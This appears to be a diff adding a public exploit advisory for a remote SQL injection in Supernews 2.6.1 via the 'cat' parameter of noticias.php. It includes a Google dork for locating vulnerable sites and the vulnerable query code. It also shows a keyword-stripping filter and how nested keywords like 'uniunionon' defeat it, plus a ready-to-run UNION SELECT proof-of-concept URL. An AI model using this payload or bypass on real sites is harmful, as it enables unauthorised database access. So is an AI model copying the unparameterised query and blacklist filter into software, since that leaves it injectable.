@@ -1,0 +1,37 @@
+##########################################################################
+## Supernews <= 2.6.1 (noticias.php cat) Remote SQL Injection
+## Google Dork: intext:"2003 - 2004 : SuperNews : Todos os direitos reservados"
+## Bug discovered by Pr0T3cT10n, <pr0t3ct10n@gmail.com>
+## Date: 31/05/2012
+## Version: 2.6.1
+## Software Link: http://phpbrasil.com/script/vT0FaOCySSH/supernews
+## ISRAEL
+##########################################################################
+##          Author will be not responsible for any damage.
+##########################################################################
+## Vulnerable Code - noticias.php [30-31]:
+30.	$idcategoria = formatDados($_GET['cat']);
+31.	$query = mysql_query("SELECT id, categoria FROM {$prefixdb}notcategorias WHERE id=$idcategoria ORDER BY categoria");
+
+## NOTE:
+## As you can see there is filter to variable $idcategoria.
+
+## Function code - funcao.php [106-112]:
+106.function formatDados($data) { 
+107.	$data = strip_tags($data);
+108.	$data = trim($data);
+109.	$data = get_magic_quotes_gpc() == 0 ? addslashes($data) : $data;
+110.	$data = preg_replace("@(--|\#|\*|;|select|union|drop|insert|delete|xp_|\=| or |-shutdown|update| and |&|')@s", "", $data);
+111.	return $data;
+112.}
+
+## As you can see, this function can be bypassed easily by the following example:
+# string 'uniunionon' will replace to clean 'union'
+# string 'seleselectct' will replace to clean 'select'
+
+## SQL Injection PoC:
+## http://www.example.com/noticias.php?cat=-1+uniunionon+seleselectct+1,version()--
+##########################################################################
+# Cya :)
+# 0x31337.net
+##########################################################################
